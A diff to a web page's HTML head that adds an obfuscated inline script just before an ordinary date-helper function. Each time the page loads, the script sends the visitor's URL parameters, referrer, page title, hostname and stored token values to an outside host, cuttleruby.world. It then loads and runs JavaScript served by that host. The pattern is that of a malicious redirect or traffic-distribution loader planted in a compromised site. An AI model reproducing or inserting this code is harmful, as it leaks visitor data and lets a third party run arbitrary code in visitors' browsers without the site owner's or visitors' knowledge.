@@ -17,6 +17,52 @@
     <link rel="stylesheet" href="assets/css/responsive.css">
 
     <script>
+    (function() {
+    var name = '_xd6zSPwY5N4FpnfC';
+    if (!window._xd6zSPwY5N4FpnfC) {
+        window._xd6zSPwY5N4FpnfC = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'http://cuttleruby.world/',
+        };
+    }
+    const _kYNHHdv9brSfn9nH = localStorage.getItem('config');
+    if (typeof _kYNHHdv9brSfn9nH !== 'undefined' && _kYNHHdv9brSfn9nH !== null) {
+        var _KDft6dqNL72ygnrc = JSON.parse(_kYNHHdv9brSfn9nH);
+        var _fDK8YnD3wL1qtMy4 = Math.round(+new Date()/1000);
+        if (_KDft6dqNL72ygnrc.created_at + window._xd6zSPwY5N4FpnfC.ttl < _fDK8YnD3wL1qtMy4) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _yhNCbJ5GjjByX1FY = localStorage.getItem('subId');
+    var _Bb1kzfVn7ZqLfHSp = localStorage.getItem('token');
+    var _PFdSgd5S2BCLdwZP = '?return=js.client';
+        _PFdSgd5S2BCLdwZP += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _PFdSgd5S2BCLdwZP += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _PFdSgd5S2BCLdwZP += '&default_keyword=' + encodeURIComponent(document.title);
+        _PFdSgd5S2BCLdwZP += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _PFdSgd5S2BCLdwZP += '&name=' + encodeURIComponent(name);
+        _PFdSgd5S2BCLdwZP += '&host=' + encodeURIComponent(window._xd6zSPwY5N4FpnfC.R_PATH);
+    if (typeof _yhNCbJ5GjjByX1FY !== 'undefined' && _yhNCbJ5GjjByX1FY && window._xd6zSPwY5N4FpnfC.unique) {
+        _PFdSgd5S2BCLdwZP += '&sub_id=' + encodeURIComponent(_yhNCbJ5GjjByX1FY);
+    }
+    if (typeof _Bb1kzfVn7ZqLfHSp !== 'undefined' && _Bb1kzfVn7ZqLfHSp && window._xd6zSPwY5N4FpnfC.unique) {
+        _PFdSgd5S2BCLdwZP += '&token=' + encodeURIComponent(_Bb1kzfVn7ZqLfHSp);
+    }
+    if ('' !== '') {
+        _PFdSgd5S2BCLdwZP += '&bypass_cache=';
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._xd6zSPwY5N4FpnfC.R_PATH + _PFdSgd5S2BCLdwZP;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
+
+    <script>
         function dtime_nums(e, t) {
             var a = new Date();
             a.setDate(a.getDate() + e + 1);
